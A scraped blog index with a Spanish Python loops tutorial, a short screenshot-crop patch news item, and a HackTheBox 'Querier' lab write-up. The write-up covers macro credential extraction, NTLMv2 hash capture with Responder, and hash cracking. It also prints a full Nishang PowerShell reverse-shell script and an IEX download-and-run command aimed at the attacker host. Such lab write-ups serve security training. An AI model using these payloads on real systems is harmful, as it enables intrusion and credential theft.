numero = 10while numero &gt; 0:  print( Imprimir el numero , numero)  numero -= 1Imprimir el numero 10Imprimir el numero 9Imprimir el numero 8Imprimir el numero 7Imprimir el numero 6Imprimir el numero 5Imprimir el numero 4Imprimir el numero 3Imprimir el numero 2Imprimir el numero 1En consecuancia la condición no se hara infinita y solo se cumplira hasta que en nuestro caso numero = 1 ya que cuando este en la siguiente iteración valga 0, la condición no se cumplira y el programa finalizara. While en una linea #: Al igual que con otras estructuras de Python, los bucles while también pueden implementarse utilizando una única línea de código. numero = 10while numero &gt; 0: numero -= 1; print(numero)9876543210Sentencias break, continue y pass #: Sentencia break #: La sentencia break es una palabra reservada de python que podemos utilizar para terminar de manera inmediata la ejecución de una estructura de control de flujo for o while. El flujo de ejecución del programa pasará a la siguiente línea de código que se encuentre fuera de la estructura de control flujo. Si definimos un bucle for que itere entre todos los elementos de mi lista cursos, por cada interación nos da los elementos. cursos = [ python ,  javascript ,  php ]for curso in cursos:  print(curso)pythonjavascriptphpAhora que pasa si utilizamos la sentencia break dentro de nuestro codigo previo. cursos = [ python ,  javascript ,  php ]for curso in cursos:  print(curso)  breakpythonComo podemos ver, esta vez solo nos muestra como resultado python y esto como se menciono anteriormente es por que la sentencia break la usamos para terminar de manera inmediata la elecución de nuestro control de flujo for. Por lo tanto la instrucción itera la primera vez e imprime python, pero al definir break seguidamente despues de mostrar el valor en pantalla nos rompe inmediatamente la ejecución del bucle y pasa automaticamente a la siguiente linea del programa. Como fuera del bucle nosotros no definimos otra linea de codigo, simplemente el programa finaliza. Podemos hacer lo mismo con bucles while ya que el proceso de funcionamiento de break es el mismo. numero = 5while numero &gt; 0:  print(numero)  numero -= 1  break5De la misma manera al ejecutarse la primera iteración, break nos rompe inmediatamente el bucle. Sentencia continue #: La sentencia continue es otra palabra reservada de Python sin embargo, a diferencia de la sentencia break, no termina la ejecución completa de los bucles for y while sino que termina únicamente la ejecución de la iteración actual. Vemoslo como funciona de manera practica. Si ejecutamos nuestro codigo anterior, pero esta vez usamos continue. Pues parece que no hubiera pasado nada, pero no. cursos = [ python ,  javascript ,  php ]for curso in cursos:  print(curso)  continuepythonjavascriptphpLo que sucede es que el bucle comienza a evaluar la condición curso un cursos, ejecuta la sentencia donde nos imprime python, despues encuentra la palabra continue, lo que causa que rompa la iteración actual y continua con la siguiente iteración cogiendo el siguiente string javascript y asignandosela a la variable curso.  Debemos tener en cuenta que aunque funcionen de manera similar brek y continue no son lo mismo, puesto que break rompe la ejecución entera del bucle y continue solo rompe la iteración actual. Es por ello que si por ejemplo definimos el siguiente codigo. cursos = [ python ,  javascript ,  php ]for curso in cursos:  print(curso)  continue  print( sentencia siguiente al continue )pythonjavascriptphpLo que sucede es que me va a sacar todos los valores, pero cuando llega al continue rompe la ejecución actual y continua a la siguiente por lo tanto el print definido despues nunca se ejecutara. Pero seguro te preguntaras para que me sirve el continue si todo lo que podemos despues nunca se va a ejecutar?. Pues nosotros podemos controlar cuando queremos que el continue se ejecute, podriamos hacer esto por ejemplo con la sentencia if. Supongamos que de nuestra lista de cursos, no quiero que se me muestre solo el de javascript. Pues comenzariamos a definir nuestro codigo, con nuestra sentencia for y dentro puedo definir una condición que cuando curso == javascript me ejecute un continue y de lo contrario que me imprima el curso. cursos = [ python ,  javascript ,  php ]for curso in cursos:  if curso ==  javascript :    continue  print(curso)pythonphpY como resultado lo que hara sera evaluar la condición, primero ejecutandose curso == python, nos lo muestra en pantalla y en la segunda iteración comocurso == javascript ejecutara el continue y no lo mostrara ya que rompera la interación, despues finalmente curso == php y como no cumple la condición del if tambien nos lo mostrara en pantalla. Sentencia pass #: La sentencia pass es una palabra reservada que nos permite definir el esqueleto de diferentes estructuras de diferentes tipos (funciones, if, while, for. . . ) sin indicarle ninguna línea de código en el cuerpo de la estructura. Esto en palabras mas simples se refiere a cuando estamos escribiendo nuestro codigo definiendo solo la estructura sin contenido. Si por ejemplo definimos una función vacia y la ejecutamos python nos arrojara un error. def funcion(): File  &lt;ipython-input-29-8a7f00d2525c&gt; , line 1  def funcion():         ^IndentationError: expected an indented blockEntonces lo que podemos hacer es agregar en nuestra función vacia la sentencia pass. def funcion():  passY al ejecutarlo de esta manera se omitira la sentencia, como si seria una sentencia sin ejecución y ya no veriamos el error. Veamoslo en un ejemplo mas practico, supongamos que tenemos un bucle, pero todavia no definimos el codigo que se ejecutara dentro de el, si lo dejamos vacio y ejecutamos nos arrojara un error. lenguajes = [ python ,  golang ,  ruby ,  node ,  rust ]# Aun no defino el codigo que se ejecutara. for lenguaje in lenguaje:File  &lt;ipython-input-32-2db429f2850e&gt; , line 2  # Aun no defino el codigo que se ejecutara                       ^IndentationError: expected an indented blockPero si dentro del bucle usamos pass, entonces lo que hara es omitirse la sentencia y por lo tanto no obtendremos un error y podamos seguir definiendo el esquema de nuestro codigo. for lenguaje in lenguaje:  # Aun no defino el codigo que se ejecutara  passPython Orientado a Objetos #: En la proxima actualización…. 😄 "
    }, {
    "id": 41,
    "url": "http://localhost:4000/novedades/parche-capturadePantalla-windows",
    "title": "Windows 10 y 11 ya tienen parches para las capturas de pantalla",
    "body": "2023/03/28 - Despues que unos investigadores de ciberseguridad habían descubierto un fallo en los móviles Google Pixel y los ordenadores con Windows. Según explicaban, el editor de capturas de pantalla de estos dispositivos mostraba las imágenes completas pese a que los usuarios la recortasen. Segun se confirma se debian realizar ciertos pasos para confirmarlo.  https://twitter. com/wdormann/status/1638235267919233024?ref_src=twsrc%5Etfw Copy an image (to have a backup) Open one with Snipping tool Crop it to make it much smaller Click the Save icon Compare file sizes of cropped and original Wonder about the world that you live inEl fallo permitía que aquellos que recibían las capturas recortadas en PNG pudiesen recuperar parte de la imagen original, dejando visible lo que los usuarios habían querido ocultar. Esto podia ocasinar que se viesen datos sensibles. Ahora, tanto Microsoft como Google, han lanzado unos parches de seguridad para solucionarlo. Por lo tanto, los propietarios de dispositivos Pixel solo tendrán que actualizarlos para evitar recortes de pantalla inservibles. Sin embargo, los de Windows tendrán que dirigirse a Microsoft Store para hacer lo propio, pero con las plataformas y no con el ordenador. "
    }, {
    "id": 42,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Querier",
    "title": "Maquina Querier - htb writeup",
    "body": "2023/03/28 - El dia de hoy vamos a estar resolviendo la maquina Querier de hackthebox que es una Windows de dificultad Media. Comenzaremos enumerando los recursos compartidos smb para obtener la contraseña de un usuario, informando que puede iniciar sesión en el mssql-server. Para obtener el usuario en el sistema, podemos robar el hash del usuario mssql-svc ejecutando el comando xp_dirtree y finalmente para la escalada de privilegios al administrador que es bastante sencilla aprovecharemos el script powerup. ps1 de powersploit para obtener las credenciales administrativas alojadas en un archivo xml. Vamos a comenzar como siempre creando un directorio con el nombre de la maquina: ❯ mkdir Querier❯ ls Querier❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 125PING 10. 10. 10. 125 (10. 10. 10. 125) 56(84) bytes of data. 64 bytes from 10. 10. 10. 125: icmp_seq=1 ttl=127 time=137 ms--- 10. 10. 10. 125 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 137. 483/137. 483/137. 483/0. 000 msVemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 125 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-03-25 14:23 GMTInitiating SYN Stealth Scan at 14:23Scanning 10. 10. 10. 125 [65535 ports]Discovered open port 135/tcp on 10. 10. 10. 125Discovered open port 139/tcp on 10. 10. 10. 125Discovered open port 445/tcp on 10. 10. 10. 125Discovered open port 49664/tcp on 10. 10. 10. 125Discovered open port 49665/tcp on 10. 10. 10. 125Discovered open port 49670/tcp on 10. 10. 10. 125Discovered open port 47001/tcp on 10. 10. 10. 125Discovered open port 49668/tcp on 10. 10. 10. 125Discovered open port 49666/tcp on 10. 10. 10. 125Discovered open port 49667/tcp on 10. 10. 10. 125Discovered open port 1433/tcp on 10. 10. 10. 125Discovered open port 49669/tcp on 10. 10. 10. 125Discovered open port 49671/tcp on 10. 10. 10. 125Discovered open port 5985/tcp on 10. 10. 10. 125Completed SYN Stealth Scan at 14:23, 19. 31s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 125Host is up, received user-set (0. 11s latency). Scanned at 2023-03-25 14:23:13 GMT for 19sNot shown: 65090 closed tcp ports (reset), 431 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE   REASON135/tcp  open msrpc    syn-ack ttl 127139/tcp  open netbios-ssn syn-ack ttl 127445/tcp  open microsoft-ds syn-ack ttl 1271433/tcp open ms-sql-s   syn-ack ttl 1275985/tcp open wsman    syn-ack ttl 12747001/tcp open winrm    syn-ack ttl 12749664/tcp open unknown   syn-ack ttl 12749665/tcp open unknown   syn-ack ttl 12749666/tcp open unknown   syn-ack ttl 12749667/tcp open unknown   syn-ack ttl 12749668/tcp open unknown   syn-ack ttl 12749669/tcp open unknown   syn-ack ttl 12749670/tcp open unknown   syn-ack ttl 12749671/tcp open unknown   syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 19. 47 seconds      Raw packets sent: 95410 (4. 198MB) | Rcvd: 82570 (3. 303MB)Podemos ver puertos interesantes que se encuentran abiertos como 135 rpc , 139 ldap , 445 smb , 1433 mssql y 5985 winrm. Escaneo de Version y Servicios. : ❯ nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10. 10. 10. 125 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-03-25 14:26 GMTNmap scan report for 10. 10. 10. 125Host is up (0. 44s latency). PORT   STATE SERVICE    VERSION135/tcp  open msrpc     Microsoft Windows RPC139/tcp  open netbios-ssn  Microsoft Windows netbios-ssn445/tcp  open microsoft-ds?1433/tcp open ms-sql-s   Microsoft SQL Server 2017 14. 00. 1000. 00; RTM| ms-sql-ntlm-info: |  Target_Name: HTB|  NetBIOS_Domain_Name: HTB|  NetBIOS_Computer_Name: QUERIER|  DNS_Domain_Name: HTB. LOCAL|  DNS_Computer_Name: QUERIER. HTB. LOCAL|  DNS_Tree_Name: HTB. LOCAL|_ Product_Version: 10. 0. 17763| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2023-03-25T14:21:57|_Not valid after: 2053-03-25T14:21:57|_ssl-date: 2023-03-25T14:27:31+00:00; -1s from scanner time. 5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found47001/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found49664/tcp open msrpc     Microsoft Windows RPC49665/tcp open msrpc     Microsoft Windows RPC49666/tcp open msrpc     Microsoft Windows RPC49667/tcp open msrpc     Microsoft Windows RPC49668/tcp open msrpc     Microsoft Windows RPC49669/tcp open msrpc     Microsoft Windows RPC49670/tcp open msrpc     Microsoft Windows RPC49671/tcp open msrpc     Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -1s, deviation: 0s, median: -1s| ms-sql-info: |  10. 10. 10. 125:1433: |   Version: |    name: Microsoft SQL Server 2017 RTM|    number: 14. 00. 1000. 00|    Product: Microsoft SQL Server 2017|    Service pack level: RTM|    Post-SP patches applied: false|_  TCP port: 1433| smb2-time: |  date: 2023-03-25T14:27:20|_ start_date: N/A| smb2-security-mode: |  3. 1. 1: |_  Message signing enabled but not requiredService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 76. 96 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         135   RPC   Microsoft Windows RPC       139   LDAP   Microsoft Windows netbios-ssn       445   SMB   ?       1433   MSSQL-S   Microsoft SQL Server 2017 14. 00. 1000. 00; RTM       5985   WINRM   Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)   Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usaremos la herramienta crackmapexec: ❯ crackmapexec smb 10. 10. 10. 125SMB     10. 10. 10. 125  445  QUERIER     [*] Windows 10. 0 Build 17763 x64 (name:QUERIER) (domain:HTB. LOCAL) (signing:False) (SMBv1:False)Vamos a buscar si hay recursos compartidos a los que podemos acceder, para ello podemos hacer uso de smbmap con los parametros -H para especificar el host y -u para hacer uso de una sesion nula. ❯ smbmap -H 10. 10. 10. 125 -u 'null'[+] Guest session  	IP: 10. 10. 10. 125:445	Name: 10. 10. 10. 125                   	Disk                         	Permissions	Comment	----                         	-----------	-------	ADMIN$                      	NO ACCESS	Remote Admin	C$                        	NO ACCESS	Default share	IPC$                       	READ ONLY	Remote IPC	Reports                      	READ ONLY	Despues de ver que si podemos listar los recursos compartidos, vemos uno interesante con el nombre de Reports vamos a ingresar en el para ver su contenido, añadiremos para eso el parametro ‘-r’ y el nombre del recurso: ❯ smbmap -H 10. 10. 10. 125 -u 'null' -r Reports[+] Guest session  	IP: 10. 10. 10. 125:445	Name: 10. 10. 10. 125                   	Disk                         	Permissions	Comment	----                         	-----------	-------	Reports                      	READ ONLY		. \Reports\*	dr--r--r--        0 Mon Jan 28 23:26:31 2019	. 	dr--r--r--        0 Mon Jan 28 23:26:31 2019	. . 	fr--r--r--      12229 Mon Jan 28 23:26:31 2019	Currency Volume Report. xlsmDentro existe un archivo con la extension xlsm, asi que vamos a descargarnoslo y renombrar el archivo a un nombre mas comodo: ❯ smbmap -H 10. 10. 10. 125 -u 'null' --download  Reports\Currency Volume Report. xlsm [+] Starting download: Reports\Currency Volume Report. xlsm (12229 bytes)[+] File output to: /home/fmiracle/Machines/Querier/content/10. 10. 10. 125-Reports_Currency Volume Report. xlsm❯ ls 10. 10. 10. 125-Reports_Currency Volume Report. xlsm❯ mv 10. 10. 10. 125-Reports_Currency\ Volume\ Report. xlsm Report. xlsm❯ ls Report. xlsmExplotación #: Como es un archivo xlsm trataremos con el comando strings lista del archivo algunos caracteres legibles: ❯ strings Report. xlsm[Content_Types]. xml apP&lt;*Fi+id|}5o=`FhO(%$_rels/. rels BKwAHGJy(vUSh9iAl no ver informacion interesante, vamos a utilizar un herramienta de github llamada olebva:  Olevba. Esta herramienta nos permite analizar archivos OLE y OpenXML, como documentos de MS Office para poder detectar macros en texto claro. Ejecutamos la herramienta pasandole el archivo xlsm y esta nos parsea la informacion donde podemos ver un usario y contraseña: ❯ olevba Report. xlsmolevba 0. 60 on Python 3. 9. 2 - http://decalage. info/python/oletools===============================================================================FILE: Report. xlsmType: OpenXMLWARNING For now, VBA stomping cannot be detected for files in memory-------------------------------------------------------------------------------VBA MACRO ThisWorkbook. cls in file: xl/vbaProject. bin - OLE stream: 'VBA/ThisWorkbook'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ' macro to pull data for client volume reports'' further testing requiredPrivate Sub Connect()Dim conn As ADODB. ConnectionDim rs As ADODB. RecordsetSet conn = New ADODB. Connectionconn. ConnectionString =  Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6 conn. ConnectionTimeout = 10conn. OpenIf conn. State = adStateOpen Then ' MsgBox  connection successful   'Set rs = conn. Execute( SELECT * @@version; ) Set rs = conn. Execute( SELECT * FROM volume; ) Sheets(1). Range( A1 ). CopyFromRecordset rs rs. CloseEnd IfEnd Sub-------------------------------------------------------------------------------VBA MACRO Sheet1. cls in file: xl/vbaProject. bin - OLE stream: 'VBA/Sheet1'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro)+----------+--------------------+---------------------------------------------+|Type   |Keyword       |Description                 |+----------+--------------------+---------------------------------------------+|Suspicious|Open        |May open a file               ||Suspicious|Hex Strings     |Hex-encoded strings were detected, may be  ||     |          |used to obfuscate strings (option --decode to||     |          |see all)                   |+----------+--------------------+---------------------------------------------+Vamos a proceder a verificar si las credenciales son validas para ello usaremos crackmapexec: ❯ crackmapexec smb 10. 10. 10. 125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUPSMB     10. 10. 10. 125  445  QUERIER     [*] Windows 10. 0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)SMB     10. 10. 10. 125  445  QUERIER     [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6 Como tenemos credenciales validas, podemos tratar de conectarnos al servicio mssql que vimos antes, para ello usaremos la herramienta mssqlclient. py que viene incluida en la suite de impacket:  https://github. com/fortra/impacketEspecificamos tal como nos indica el uso de la herramienta el dominio, usuario, contraseña y adicionamos el parametro -windows-auth el cual permite utilizar o no la autenticación de Windows (por defecto False) ❯ mssqlclient. py WORKGROUP/reporting@10. 10. 10. 125 -windows-authImpacket v0. 9. 24 - Copyright 2021 SecureAuth CorporationPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'volume'. [*] INFO(QUERIER): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands SQL&gt;Una vez conectados al servicio lo que intentaremos hacer es usar xp_cmdshell para tratar de ejecutar comandos, pero vemos que el usuario reporting no cuenta con los privilegios suficientes: SQL&gt; xp_cmdshell 'whoami'[-] ERROR(QUERIER): Line 1: Incorrect syntax near 'whoami'. SQL&gt; sp_configure 'show_advance', 1[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action. SQL&gt; sp_configure 'xp_cmdshell', 1[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option. SQL&gt; sp_configure 'show_advance', 1[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action. SQL&gt; reconfigure[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement. SQL&gt;Probaremos a tratar de lanzar una conexion con el comando xp_dirtree para tratar de realizar una conexion a un recurso compartido que alojare en mi maquina y mientras el servidor trata de auntenticarse a mi maquina, con responder intentare capturar el hash ` Net-NTLMv2`. -] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement. SQL&gt; xp_dirtree  \\10. 10. 16. 4\test subdirectory                                                                                                                              depth  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  -----------  SQL&gt; ❯ responder -I tun0                     __ . ----. -----. -----. -----. -----. -----. --| |. -----. ----.  |  _| -__|__ --| _ | _ |   | _ || -__|  _| |__| |_____|_____|  __|_____|__|__|_____||_____|__|          |__|[+] HTTP Options:      NBT-NS, LLMNR &amp; MDNS Responder 3. 0. 6. 0  Serving EXE        [OFF] Author: Laurent Gaffie (laurent. gaffie@gmail. com) To kill this script hit CTRL-C[+] Poisoning Options:[+] Poisoners:  LLMNR           [ON]  NBT-NS           [ON]  DNS/MDNS          [ON]  Fingerprint hosts     [OFF][+] Servers:  HTTP server        [ON]  HTTPS server        [ON]  WPAD proxy         [OFF]  Auth proxy         [OFF]  SMB server         [ON]  Kerberos server      [ON]  SQL server         [ON]  FTP server         [ON]  IMAP server        [ON]  POP3 server        [ON]  SMTP server        [ON]  DNS server         [ON]  LDAP server        [ON]  RDP server         [ON]  DCE-RPC server       [ON]  WinRM server        [ON][+] HTTP Options:  Always serving EXE     [OFF]  Serving EXE        [OFF]  Serving HTML        [OFF]  Upstream Proxy       [OFF][+] Poisoning Options:  Analyze Mode        [OFF]  Force WPAD auth      [OFF]  Force Basic Auth      [OFF]  Force LM downgrade     [OFF]  Fingerprint hosts     [OFF][+] Generic Options:  Responder NIC       [tun0]  Responder IP        [10. 10. 16. 4]  Challenge set       [random]  Don't Respond To Names   ['ISATAP'][+] Current Session Variables:  Responder Machine Name   [WIN-LBGCELK616Y]  Responder Domain Name   [68T9. LOCAL]  Responder DCE-RPC Port   [49780][+] Listening for events. . . [SMB] NTLMv2-SSP Client  : 10. 10. 10. 125[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc[SMB] NTLMv2-SSP Hash   : mssql-svc::QUERIER:ba540bb74f74294fbtuvimos un hash correspondiente al usario mssql-svc el cual trataremos de crackearlo con john: ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuscorporate568   (mssql-svc)1g 0:00:00:37 DONE (2023-03-25 15:30) 0. 02700g/s 241965p/s 241965c/s 241965C/s correforenz. . cornamucklaUse the  --show --format=netntlmv2  options to display all of the cracked passwords reliablySession completedJohn logra obtener la contraseña en texto claro y ahora contamos con nuevas credenciales que podemos probar:  usuario: mssql-svc password: corporate568Volvemos a validar la contraseña con crackmapexecy efectivamente son validas: ❯ crackmapexec smb 10. 10. 10. 125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUPSMB     10. 10. 10. 125  445  QUERIER     [*] Windows 10. 0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)SMB     10. 10. 10. 125  445  QUERIER     [+] WORKGROUP\mssql-svc:corporate568Ya que ahora disponemos de credenciales del usuario mssql-svc quiero pensar que me puedo conectar con mssqlclient. py y que este contara con mayores privilegios y esta vez si que podremos ejecutar comandos: Password:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'master'. [*] INFO(QUERIER): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commandsSQL&gt; sp_configure 'xp_cmdshell', 1[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option. SQL&gt; sp_configure 'show_advanced', 1[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. SQL&gt; reconfigureSQL&gt; sp_configure 'xp_cmdshell', 1[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. SQL&gt; reconfigureSQL&gt; xp_cmdshell  whoami output                                       --------------------------------------------------------------------------------  querier\mssql-svc                                 NULL                                        SQL&gt;Esta vez si conseguimos ejecutar comandos, lo siguiente sera ganar acceso con una consola en powershell y movernos mas comodamente desde nuestra maquina victima, y para ello usaremos `Invoke-PowerShellTcp. ps1 ` del repositorio de Nishang:  Nishang. Editaremos la linea final del script y al ejecutarlo con Iex nos interprete el script incluida la linea final de ese modo matamos dos pajaros de un tiro: function Invoke-PowerShellTcp { &lt;#. SYNOPSISNishang script which can be used for Reverse or Bind interactive PowerShell from a target. . DESCRIPTIONThis script is able to connect to a standard netcat listening on a port when using the -Reverse switch. Also, a standard netcat can connect to this script Bind to a specific port. The script is derived from Powerfun written by Ben Turner &amp; Dave Hardy. PARAMETER IPAddressThe IP address to connect to when using the -Reverse switch. . PARAMETER PortThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens. . EXAMPLEPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192. 168. 254. 226 -Port 4444Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on the given IP and port. . EXAMPLEPS &gt; Invoke-PowerShellTcp -Bind -Port 4444Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. . EXAMPLEPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must belistening on the given IP and port. . LINKhttp://www. labofapenetrationtester. com/2015/05/week-of-powershell-shells-day-1. htmlhttps://github. com/nettitude/powershell/blob/master/powerfun. ps1https://github. com/samratashok/nishang#&gt;     [CmdletBinding(DefaultParameterSetName= reverse )] Param(    [Parameter(Position = 0, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 0, Mandatory = $false, ParameterSetName= bind )]    [String]    $IPAddress,    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= bind )]    [Int]    $Port,    [Parameter(ParameterSetName= reverse )]    [Switch]    $Reverse,    [Parameter(ParameterSetName= bind )]    [Switch]    $Bind  )    try   {    #Connect back if the reverse switch is used.     if ($Reverse)    {      $client = New-Object System. Net. Sockets. TCPClient($IPAddress,$Port)    }    #Bind to the provided port if Bind switch is used.     if ($Bind)    {      $listener = [System. Net. Sockets. TcpListener]$Port      $listener. start()        $client = $listener. AcceptTcpClient()    }     $stream = $client. GetStream()    [byte[]]$bytes = 0. . 65535|%{0}    #Send back current username and computername    $sendbytes = ([text. encoding]::ASCII). GetBytes( Windows PowerShell running as user   + $env:username +   on   + $env:computername +  `nCopyright (C) 2015 Microsoft Corporation. All rights reserved. `n`n )    $stream. Write($sendbytes,0,$sendbytes. Length)    #Show an interactive PowerShell prompt    $sendbytes = ([text. encoding]::ASCII). GetBytes('PS ' + (Get-Location). Path + '&gt;')    $stream. Write($sendbytes,0,$sendbytes. Length)    while(($i = $stream. Read($bytes, 0, $bytes. Length)) -ne 0)    {      $EncodedText = New-Object -TypeName System. Text. ASCIIEncoding      $data = $EncodedText. GetString($bytes,0, $i)      try      {        #Execute the command on the target.         $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )      }      catch      {        Write-Warning  Something went wrong with execution of command on the target.           Write-Error $_      }      $sendback2 = $sendback + 'PS ' + (Get-Location). Path + '&gt; '      $x = ($error[0] | Out-String)      $error. clear()      $sendback2 = $sendback2 + $x      #Return the results      $sendbyte = ([text. encoding]::ASCII). GetBytes($sendback2)      $stream. Write($sendbyte,0,$sendbyte. Length)      $stream. Flush()     }    $client. Close()    if ($listener)    {      $listener. Stop()    }  }  catch  {    Write-Warning  Something went wrong! Check if the server is reachable and you are using the correct port.       Write-Error $_  }}Invoke-PowerShellTcp -Reverse -IPAddress 10. 10. 16. 4 -Port 443Seguidamente procedemos a montarnos un servidor local con python donde alojaremos el script Invoke-PowerShellTcp. ps1: ❯ ls Invoke-PowerShellTcp. ps1  Report. xlsm❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . Ejecutamos la instruccion con xp_cmdshell: SQL&gt; xp_cmdshell  powershell IEX(New-Object Net. WebClient). downloadString(\ http://10. 10. 16. 4/Invoke-PowerShellTcp. ps1\ ) Nos ponemos en escucha con ncat en puerto 443 y ganamos acceso al sistema: ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 125. Ncat: Connection from 10. 10. 10. 125:49681. Windows PowerShell running as user mssql-svc on QUERIERCopyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\Windows\system32&gt;whoamiquerier\mssql-svcPS C:\Windows\system32&gt;AHora vamos al directorio personal del usuario y visializamos la primera flag user. txt: PS C:\Windows\system32&gt;cd C:\Users\PS C:\Users&gt; dir  Directory: C:\UsersMode        LastWriteTime     Length Name                                 ----        -------------     ------ ----                                 d-----    1/28/2019 10:17 PM        Administrator                             d-----    1/28/2019 11:42 PM        mssql-svc                               d-r---    1/28/2019 10:17 PM        Public                                PS C:\Users&gt; cd mssql-svcPS C:\Users\mssql-svc&gt; cd DesktopPS C:\Users\mssql-svc\Desktop&gt; type user. txt089b86d375c2a51f4aae02b9a984a9eeEscalada de Privilegios #: Una vez dentro ejecutamos el comando whoami /priv y vemos que tenemos activado el SeImpersonatePrivilege PS C:\Windows\system32&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name        Description                State  ============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token       DisabledSeIncreaseQuotaPrivilege   Adjust memory quotas for a process    DisabledSeChangeNotifyPrivilege    Bypass traverse checking         Enabled SeImpersonatePrivilege    Impersonate a client after authentication Enabled SeCreateGlobalPrivilege    Create global objects           Enabled SeIncreaseWorkingSetPrivilege Increase a process working set      DisabledPodriamos utilizar JuicyPotato, pero esta vez vamos a usar PowerUp. ps1 de powersploit para enumerar el sistema. Nos volvemos a compartir un servidor web con python3: ❯ ls Invoke-PowerShellTcp. ps1  PowerUp. ps1  Report. xlsm❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . 